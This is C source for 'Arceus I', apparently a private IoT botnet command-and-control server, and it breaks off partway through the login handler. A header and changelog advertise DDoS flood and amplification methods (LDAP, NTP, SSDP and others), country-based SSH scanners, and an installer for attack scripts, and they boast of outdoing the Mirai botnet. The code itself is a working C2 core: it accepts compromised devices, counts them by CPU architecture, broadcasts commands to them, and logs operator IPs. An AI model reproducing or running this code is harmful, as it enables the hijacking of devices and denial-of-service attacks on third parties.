/*
╔═════════════════════════╗
║         Arceus I        ║                                 ╔═════════════════════════╗
║           ---           ║                                 ║     ARCEUS I : BETA     ║
║          GL3.0          ║                                 ╚═════════════════════════╝
║           666           ║
╚═════════════════════════╝ 

╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ THIS VERSION WILL 'NOT' BE RELEASED TO THE PUBLIC DUE TO THE REDUNDANT ABUSE FROM THE COMMUNITY USING CYBER CYBER-WARFARE WEAPONS SUCH AS THIS.║                 
║ IF YOU ARE ABLE TO GET 'YOUR' HANDS ON THIS, PLEASE RESPECT THE AUTHORISATION AND WORK THE DEVELOPERS HAVE PUT INTO THIS SOURCE / PROJECT BETA.║                 
╠═════════════════════════════════════════════════════════════════╦══════════════════════════════════════════════════════════════════════════════╣
║  LICENSING :  GNUV3 [GNU GENERAL PUBLIC LICENSE VERSION 3.0]    ║ PROJECT ARCEUS IS A C2 SOURCE USING A CHANNEL CONNECTION TO RUN A DISPLAY    ║                                                                         
║  VALID     :  03/23/19                                          ║ SCREEN ON THE CONNECTION STATED VIA THE PORT 'SCREENED' TO. THIS PROJECT     ║                                                                        
║  EXPIRY    :  03/23/22                                          ║ HAS CERTAIN DEPENDENCIES IN ORDER TO PROPERLY COMPLY WITH EACH ADMIN USING   ║                                                                           
║  --                                                             ║ ARCEUS. WE ARE IN NO JEOPARDY IF YOU ARE CAUGHT BY ANY MEANS. MEANING ANY    ║                                                                                      
║  STATE     :  PRIVATE                                           ║ TYPE OF AUTHORITY, THIS APPLIES TO POSSESSION AND USAGE OF THIS PROJECT.     ║                                                                        
║  OWNERSHIP :  N/A                                               ║ --                                                                           ║ 
║  NAME      :  ARCEUS I                                          ║ THIS PROJECT WAS DESIGNED BOTH FOR ME AND JACK'S' USAGE ONLY. THIS WORK IS   ║                                                                           
║  --                                                             ║ UNDER 2 COUNTS OF LICENSING. SPECIFICALLY GNU AS WELL AS A PRIVATE PATENTING ║                                                                            
║  CCR       : XXX-223-389                                        ║ UNDER MY OWN DIVISION. NO COVERED WORK SHALL BE DEEMED PART OF AN EFFECTIVE  ║                                                                            
║  CIPHER    : SHA-512 , AES-BYTE , CIPHER-TLS                    ║ TECHNOLOGICAL MEASURE UNDER ANY APPLICABLE LAW FULFILLING OBLIGATIONS UNDER  ║                                                                            
║  GH-ID     : ZCH-CRI.SUCC                                       ║ ARTICLE 11 OF THE WIPO COPYRIGHT TREATY ADOPTED ON 20 DECEMBER 1996, OR      ║                                                                                
║  --                                                             ║ SIMILAR LAWS PROHIBITING OR RESTRICTING CIRCUMVENTION OF SUCH MEASURES.      ║                                                                        
║  OBJ-TYPE  : C2 SOURCE X TELNET LAYER                           ║ --                                                                           ║  
║  VSSH      : N/A                                                ║ YOU MAY CONVEY A COVERED WORK IN OBJECT CODE FORM UNDER THE TERMS OF SECTIONS║                                                                           
║  OS_TYPE   : CENT_OS [6] - [7]                                  ║ 4 AND 5, PROVIDED THAT YOU ALSO CONVEY THE MACHINE-READABLE CORRESPONDING    ║                                                                          
║  --                                                             ║ SOURCE UNDER THE TERMS OF THIS LICENSE.                                      ║                                       
║  BUILD     : BETA [RELEASE BEFORE VERSION I]                    ║ --                                                                           ║  
║  DESC      : NET-WSS                                            ║                                                                              ║
║  PRJ-VAS   : 6949-3853-9891                                     ║ THIS CODE WAS FOUNDED AND CREATED BY BOTH TRANSMISSIONAL AND FLEXINGONLAMERS.║                                                                             
║  --        :                                                    ║ WE HAVE THE ENTITLED AND ORIGINAL RIGHTS TO EDIT OR UPGRADE THIS FUNCTIONAL  ║                                                                           
║  --        :                                                    ║ CODE.                                                                        ║              
║  DEV-ALIAS : TRANSMISSIONAL / FLEXINGONLAMERS                   ║                       YOURS TRULY, ZACH, TRANSMISSIONAL                      ║                                              
╚═════════════════════════════════════════════════════════════════╩══════════════════════════════════════════════════════════════════════════════╝


                      Another project me and jack have decided take on after a break of coding project 'Katura'
                      This new project is designed to fulfil the potential of a C2 source, outcompeting other C2 sources.
                      We have decided to try to recreate this source into such a tool where it will completely put
                      'Mirai' RCE-WGET exploitation to complete shame. 

                      This will be a continuous and ongoing project. We are hoping to soon create this into something that
                      exceeds the capabilities that are set by other developers creating such 'cyber-warfare' tools 
                      as this.

                      ---

                      Both me and Jack, Have the certain capabilities to create something so unique and better, through
                      the use of combined networking and programming knowledge.

                      This is a challenge both me and Jack, have decided to take on.

                      Till next time.
                      ___________________________________________________________________________________________________

Created C2 Base || Process Terminator
Added: AddUserFunction || Added UserAccounts || Added Alternative Chatroom Source || Added Functional Arch Detector (working on it, bc is broken)
Added: Added Portscanner || Added IPGeolocation
Added: Functional Logs, Includes ["IP", "Error", "LogOut", "Shell", "server"]
Added: UserID(s) ||  MD5Format For User Information


Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "HOME", "RAID"]
Added New Layer4 TCP Methods Including ["TCP-CRI", "TCP-ZACH"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc


Managed C2/CnC
Added: Logging via ["Arceus.log", "Arceus.log", "Arceus.log", "Arceus.log", "Arceus.log"]  // We are logging user commands, IPs, errors, shell attempts, and User Log-Outs
Added: Edits to (HELP) Including ["INFO", "BOTS"]
Color Codes were only Inputed for the Katura_IP.log || Now being inputted for the connection handler via screen

IPLookup Script And Snippet taken from "Cayosin", credits to the original developer of both the script and snippet of code.
=========================

These are late changelogs < 
Added IPHM Implementation > IP-Header Based methods now working. 
Added Methods: ["LDAP", "NTP", "SSDP", "TFTP", "PORTMAP"]
Added New functions, including an external SSH Scanner which uses IPBlocks based by country.
Also added alternative functions for Banning, {We are using IPTables to ban users via IP}
=====================================
Added IPHM Extensions for the following methods: ["LDAP", "SSDP", "NTP", "TFTP", "PORTMAP"]
Added IPHM Scanners for the methods above.
Added process killers for all methods and scanners based over IPHM
Added External Scanner and IPBan system using IPTables
Added SystemDetection Into Client (We are displaying system type) via: ["Linux", "windows", "android"]
Added External Installation Script for IPHM Downloads. includes scanners and attack scripts. command = .install
*/

#include <stdio.h> // Header Files [Interpreted Modules]
#include <stdlib.h> // Header Files [Interpreted Modules]
#include <string.h> // Header Files [Interpreted Modules]
#include <sys/types.h> // Header Files [Interpreted Modules]
#include <sys/socket.h> // Header Files [Interpreted Modules]
#include <netdb.h> // Header Files [Interpreted Modules]
#include <unistd.h> // Header Files [Interpreted Modules]
#include <time.h> // Header Files [Interpreted Modules]
#include <fcntl.h> // Header Files [Interpreted Modules]
#include <sys/epoll.h> // Header Files [Interpreted Modules]
#include <errno.h> // Header Files [Interpreted Modules]
#include <pthread.h> // Header Files [Interpreted Modules]
#include <signal.h> // Header Files [Interpreted Modules]
#include <ctype.h> // Header Files [Interpreted Modules]
#include <arpa/inet.h> // Header Files [Interpreted Modules]

#include "resolver.h" // Header Files [Additional Interpreted Module]

#define MAXFDS 1000000 // Maximum File Descriptor Value Statement [1000000]
//////////////////////////
#define purple = "\e[38;5;93m" // ANSI Colours
#define orange = "\e[38;5;202m" // ANSI Colours
#define pink = "\e[38;5;201m" // ANSI Colours


#define Project "Arceus C2 Source" // Defining File Principals
#define Developer ["FlexingOnLamers", "GeorgiaCri", "Transmissional", "Zach"] // Defining File Principals
#define Allies [" We do not need friends. "] // Defining File Principals
#define tools ["adduser", "domainresolver", "portscanner", "IPGeoLocation"] // Defining File Principals

struct account // Create Account Struct.
{
  char user[200]; // username
  char password[200]; // password
  char id [200]; // admin / normal [admin/normal] 
};
static struct account accounts[500];

struct clientdata_t { // Create Client Data [Telnet] Struct.
  uint32_t ip;
    char x86;  // Char Every Line For Output Communication
    char mips; // Char Every Line For Output Communication
    char arm; // Char Every Line For Output Communication
    char spc; // Char Every Line For Output Communication
    char ppc; // Char Every Line For Output Communication
    char sh4; // Char Every Line For Output Communication
    char connected; // Char Every Line For Output Communication
} clients[MAXFDS]; // Set 'CLient' File Descriptor Value As Stated

struct telnetdata_t { // Create Telnet Data Struct.
  uint32_t ip; // Unsigned_Int 32 [Internet Protocol Output]
  int connected; // Use Integer To Display 'Connnected' Value
} managements[MAXFDS]; // Set 'CLient' File Descriptor Value As Stated

static volatile FILE *fileFD; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int epollFD = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int listenFD = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]
static volatile int managesConnected = 0; // Static Volatile [Setting Each Integer For EPOLL and Listen FD]

int fdgets(unsigned char *buffer, int bufferSize, int fd) // Create Integers For Buffer Size 'Unsigned_Char'
{
  int total = 0, got = 1; // 0 = Deny / 1 = Accept Output
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; } // If Accepted [got == 1] - Display Output, Break line '\n'
  return got; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void trim(char *str) // Void To Char String, Do Not Output To Original Function Caller
{
  int i; // Output Statement Result Integers
  int begin = 0; // Output Statement Result Integers
  int end = strlen(str) - 1; // Output Statement Result Integers
  while (isspace(str[begin])) begin++; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  while ((end >= begin) && isspace(str[end])) end--; // Use 'While Loop' To Begin Function Call [Any Subzero Value] - [Calculus Is Irrelevant] - Check If Passed Character Is In 'White-Space'
  for (i = begin; i <= end; i++) str[i - begin] = str[i]; // 'I' Value - (i = begin; i <= end; i++)
  str[i - begin] = '\0'; // Start String Of 'I' Value
}

static int make_socket_non_blocking(int sfd) // Create Static Integer [Static Integer, Will Allow Concurrent Bind Socket]
{
  int flags, s; // Set Flag Integer
  flags = fcntl(sfd, F_GETFL, 0); // Set Flag Error Handle Output
  if (flags == -1) // Set Flag Value [-1]
  {
    perror("fcntl"); // Error Handling Output 
    return -1; // Error Value == -1 
  }
  flags |= O_NONBLOCK; // Set_Flag==NONBLOCK
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1) // Error Value == -1
  {
    perror("fcntl"); // Error Handling Output
    return -1; // Error Value == -1
  }
  return 0; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}


static int create_and_bind(char *port) // Socket Bind Interpretation [ Edited By Zach, Modified Header Address For Adjacent Binding and Listening]
{
  struct addrinfo hints; // Create Struct. For AddressInformation, Create 's' As Integer
  struct addrinfo *result, *rp; // Create Struct. For AddressInformation, Create 's' As Integer
  int s, sfd; // Create Struct. For AddressInformation, Create 's' As Integer
  memset(&hints, 0, sizeof(struct addrinfo)); // Fill Data Block Using 'memset'
  hints.ai_family = AF_UNSPEC; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_socktype = SOCK_STREAM; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  hints.ai_flags = AI_PASSIVE; // Socket Properties - [SOCKSTREAM, AI, UNSPEC]
  s = getaddrinfo(NULL, port, &hints, &result); // Defining 's' Value
  if (s != 0) // Call Function If 's' == 0
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s)); // Error Handling, 'Getting Address Information'
    return -1; // Error Value == -1
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol); // Socket Bind Interpretation [ Modified To Be Created As One] -- [MORE STABLE]
    if (sfd == -1) continue; // Call Function If sfd == -1
    int yes = 1; // Yes == 1
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt"); // Improved Sockopt Handling, Using SOL_SOCKET
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen); // Bind Everything Stated Above
    if (s == 0) // Call Function If 's' == 0
    {
      break; // Terminate Loop Function, Continue Connection [Broadcast]
    }
    close(sfd); // Close Concurrent Function [sfd]
  }
  if (rp == NULL) // rp == NULL, No Available Integer [May Modify This and State 'NULL' as 0]
  {
    fprintf(stderr, "Could not bind\n"); // Error Handling - Failed Socket Binding, This is Rare, Unless Same Output Port Is Used
    return -1; // Error Value == -1
  }
  freeaddrinfo(result); // Check Addresses That Have No Integer State Value '-1'
  return sfd;// Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
void broadcast(char *msg, int us, char *sender) // Broadcast The Following On Administator [Screen]
{
        int sendMGM = 1; // Send Management Value Statement. This Is Usually Set As '1'
        if(strcmp(msg, "PING") == 0) sendMGM = 0; // We Are Using 'PING/PONG' V2. [Modified The General Network Threads, Should Stop The Source From Being Slow]
        char *wot = malloc(strlen(msg) + 10); // Char Every Line For Output Communication
        memset(wot, 0, strlen(msg) + 10); // Fill In Data Block Usinf Memset. [Add +10, To Concurrent Connection]
        strcpy(wot, msg); // Strcpy Function Copies The String Pointed To By S2 Into The Object Pointed To By S1.
        trim(wot); // Trim : [wot]
        time_t rawtime; // We Want To Display The Time
        struct tm * timeinfo; // Create Struct. For Time
        time(&rawtime); // Use 'Time' Module For 'rawtime' prefix
        timeinfo = localtime(&rawtime); // Show Time Info Using Local Time
        char *timestamp = asctime(timeinfo); // Char Every Line For Output Communication
        trim(timestamp); // Trim : [timestamp]
        int i; // Output Statement Result Integers
        for(i = 0; i < MAXFDS; i++) // Set I, With MAXFDS Value
        {
                if(i == us || (!clients[i].connected)) continue; // Show Clients Connected To Broadcast
                if(sendMGM && managements[i].connected) // Send Management, To Show Value
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL); // Client Connected Output
                        send(i, sender, strlen(sender), MSG_NOSIGNAL); // Client Connected Output
                        send(i, ": ", 2, MSG_NOSIGNAL); // Client Connected Output 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL); // Client Connected Output
                send(i, "\n", 1, MSG_NOSIGNAL); // Client Connected Output
        }
        free(wot); // Release Function From [wot]
}
void *epollEventLoop(void *useless) // Create Struct via EPOLL, Use Void Function To Call Event
{
  struct epoll_event event; // Create Struct via EPOLL, Use Void Function To Call Event
  struct epoll_event *events; // Create Struct via EPOLL, Use Void Function To Call Event
  int s; // Create Struct via EPOLL, Use Void Function To Call Event
  events = calloc(MAXFDS, sizeof event); // Create Struct via EPOLL, Use Void Function To Call Event
  while (1) // While == Wait 1 Second, This Is Stable
  {
    int n, i; // State 'i' And 'n'
    n = epoll_wait(epollFD, events, MAXFDS, -1); // Set 'n' With MAXFDS
    for (i = 0; i < n; i++) // 'n' && 'i' comp
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) // Show Device Input Via EPOLL
      {
        clients[events[i].data.fd].connected = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].arm = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].mips = 0;  // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].x86 = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].spc = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].ppc = 0; // Our Devices -- More To Be Added -- Events Created Here
        clients[events[i].data.fd].sh4 = 0; // Our Devices -- More To Be Added -- Events Created Here
        close(events[i].data.fd); // Close Function
        continue; // Continue
      }
      else if (listenFD == events[i].data.fd) // Listen FD - For Events.
      {
        while (1) // While == Wait 1 Second, This Is Stable
        {
          struct sockaddr in_addr; // Create Struct For Sockaddress
          socklen_t in_len; // SOCK DEFINE
          int infd, ipIndex; // SOCK DEFINE

          in_len = sizeof in_addr;  // sock define
          infd = accept(listenFD, &in_addr, &in_len); // sock define
          if (infd == -1) // sock define
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break; // Error Validation
            else // Else
            {
              perror("accept"); // accept error handling
              break; // Terminate Process
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr; // Show Clients Connected To Broadcast
        int dup = 0; // Value The DUPLICATES
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) { // Create Index, IP
          if(!clients[ipIndex].connected || ipIndex == infd) continue; // Check Connected
          if(clients[ipIndex].ip == clients[infd].ip) { // Check Connected, IP
            dup = 1; // Dup Value == 1 [Faster]
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd; // Create Struct via EPOLL, Use Void Function To Call Event
          event.events = EPOLLIN | EPOLLET; // Create Struct via EPOLL, Use Void Function To Call Event
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event); // Create Struct via EPOLL, Use Void Function To Call Event
          if (s == -1) // 's' Value == -1 
          {
            perror("epoll_ctl"); // Epollctl Error Handling
            close(infd); // Kill infd
            break;
          }

          clients[infd].connected = 1; // I'm Getting Tired Of This..
          send(infd, "!* Arceus ON\n", 9, MSG_NOSIGNAL); // Send infd, Using Command Via Client.

        }
        continue; // Keep Going,...
      }
      else // What Else.. Smh...
      {
        int thefd = events[i].data.fd; // Unecessary To Comment, This Is Struct'in and Stating Integer.
        struct clientdata_t *client = &(clients[thefd]); // Unecessary To Comment, This Is Struct'in and Stating Integer.
        int done = 0; // Unecessary To Comment, This Is Struct'in and Stating Integer.
        client->connected = 1; // Our Devices -- More To Be Added -- Events Created Here
        client->arm = 0;  // Our Devices -- More To Be Added -- Events Created Here
        client->mips = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->sh4 = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->x86 = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->spc = 0; // Our Devices -- More To Be Added -- Events Created Here
        client->ppc = 0; // Our Devices -- More To Be Added -- Events Created Here
        while (1) // While == Wait 1 Second, This Is Stable
        {
          ssize_t count; // State, SSize Count 
          char buf[2048]; // Char Buffer To [2048] - Although, This May Change As We Want A EXTREMELY Stable Client, Testing In Progress.
          memset(buf, 0, sizeof buf); // Fill In Data-Block, This Can Also Be Stated As The Buffer Off-set [0xA - 0xB]

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) // Memset, Using The Stated Buffer-Size Value.
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; } // We Shall Break The Line, Stating This As Null.
            trim(buf); // Trim Buffer.
            if (strcmp(buf, "PING") == 0) { // Ping Is The Input Connection, Waiting For It's Response. This Has To Be Allocated.
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // PONG, Is The Response From Ping, This is The Allocation.
              continue; 
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->x86 = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->mips = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->arm = 1; // We are Loading All Of Our Devices, On The Admin Screen. 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->ppc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mArceus\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf) // We are Loading All Of Our Devices, On The Admin Screen.
                        {
                          client->spc = 1; // We are Loading All Of Our Devices, On The Admin Screen.
                        }
                                                if(strcmp(buf, "PING") == 0) { // Input Connection, Response Is Below
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // Response Line, PING/PONG Uses Strcmp
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) { // We use 'strcmp' To Compare Both Of Our Input And Output - [Response] Strings
                                                continue; } // This Is Then Used, To Output A Valid Integer
                                                printf("\"%s\"\n", buf); } // This Is The Output Here
 
                                        if (count == -1) // Error Value - [Show ERR]
                                        {
                                                if (errno != EAGAIN) // // Error Value - [Show ERR]
                                                {
                                                        done = 1; // Error Value
                                                }
                                                break;
                                        }
                                        else if (count == 0) // // Error Value - [Show ERR]
                                        {
                                                done = 1; // // Error Value - [Show ERR]
                                                break; // Break This Function. Terminate.
                                        }
                                }
 
                                if (done) // Only If Value, Is [Done] ( Equal To 0 )
                                {
                                        client->connected = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->arm = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->mips = 0;  // Display Our Devices, This Is One The Client Side. 
                                        client->sh4 = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->x86 = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->spc = 0; // Display Our Devices, This Is One The Client Side. 
                                        client->ppc = 0; // Display Our Devices, This Is One The Client Side. 
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].arm) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
unsigned int mipsConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].mips) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int x86Connected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].x86) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int spcConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].spc) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
} 

unsigned int ppcConnected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].ppc) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int sh4Connected() // Create An Unsigned Integer, For Our Device
{
        int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
        for(i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
        {
                if(!clients[i].sh4) continue; // Continue, After Device Statement.
                total++; // Total Device Value
        }
 
        return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int clientsConnected() // Create An Unsigned Integer, For Our Device
{
  int i = 0, total = 0; // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (i = 0; i < MAXFDS; i++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[i].connected) continue; // Continue, After Device Statement.
    total++; // Total Device Value
  }

  return total; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

    void *titleWriter(void *sock) // We Shall Create A Window Title For The Screen
    {
        int thefd = (long int)sock; // Creating A 'Long' Integer, For Sock output
        char string[2048]; // Char Every Line For Output Communication
        while(1) // While == Wait 1 Second, This Is Stable
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Arceus I | IoT Devices: %d | Administrators: %d %c", '\033', clientsConnected(), managesConnected, '\007'); // [Title]
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1); // Send Output Response
            sleep(2); // Sleep, So No Concurrent Processes Create Any Problems
        }
    }


int Search_in_File(char *str) // Char Every Line For Output Communication [Search In File]
{
  FILE *fp; // FILE*fp
  int line_num = 0; // Create Integer For Each Line Number
  int find_result = 0, find_line = 0; // Create Integer For Each Line Number
  char temp[512]; // Char [512]

  if ((fp = fopen("arceus.txt", "r")) == NULL) { // [Login.txt Output]
    return(-1); // Return Value
  }
  while (fgets(temp, 512, fp) != NULL) { // temp -- 512
    if ((strstr(temp, str)) != NULL) { // Constant Char Communication Between Unsigned_Integer.
      find_result++; // Finding Output Value
      find_line = line_num; // Find Line, Then Put Under Line_Numerical
    }
    line_num++; // Line Output -- Line Total
  }
  if (fp) // Check
    fclose(fp); // Kill

  if (find_result == 0)return 0; // Result Output

  return find_line;
}
void client_addr(struct sockaddr_in addr) { // Client Adress -- To Socket Adress
  printf("\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n", // Display User IP Output
    addr.sin_addr.s_addr & 0xFF, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF00) >> 8, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF0000) >> 16, // 0xFF --> + Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF000000) >> 24); // 0xFF --> + Whatever Stated Value
  FILE *logFile; // Create IP Log
  logFile = fopen("Arceus_IP.log", "a"); // Output The File
  fprintf(logFile, "\n\e[38;5;202mIP\e[38;5;93m:[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]", // IP Format, Via The Following.
    addr.sin_addr.s_addr & 0xFF, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF00) >> 8, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF0000) >> 16, // 0xFF --> Whatever Stated Value
    (addr.sin_addr.s_addr & 0xFF000000) >> 24); // 0xFF --> Whatever Stated Value
  fclose(logFile); // Close The Log File
}

void *telnetWorker(void *sock) { // Here Is Where The Magic Happens 
  int thefd = (int)sock; // Create Integer For Sock
  managesConnected++; // State Manages Connected
  int find_line; // Create Integer For Find Line Function
  pthread_t title; // Use pthread To Output Title
  char counter[2048]; // Char Every Line For Output Communication
  memset(counter, 0, 2048); // Fill Data Block - [2048]
  char buf[2048]; // Char Every Line For Output Communication
  char* nickstring; // Char Every Line For Output Communication
  char usernamez[80]; // Char Every Line For Output Communication
  char* password; // Char Every Line For Output Communication
  char *admin = "admin"; // Char Every Line For Output Communication 
  char *normal = "normal"; // Char Every Line For Output Communication
  char *owner = "owner"; // Char Every Line For Output Communication
  memset(buf, 0, sizeof buf); // Fill Data Block - [buf]
  char botnet[2048];  // Char Every Line For Output Communication
  memset(botnet, 0, 2048); // Fill Data Block - [2048]

  FILE *fp; // Check
  int i = 0; // Create Integer For I
  int c; // Create Integer For C
  fp = fopen("arceus.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp)) // feof
  {
    c = fgetc(fp); // Define C to fget
    ++i; // Total Value Size
  }
  int j = 0; // Create Integer J
  rewind(fp); // Rewind [fp]
  while (j != i - 1) // Call Integer J
  {
        fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id); // Displaying, User -- Pass, Through Specific Format
    ++j;
  }

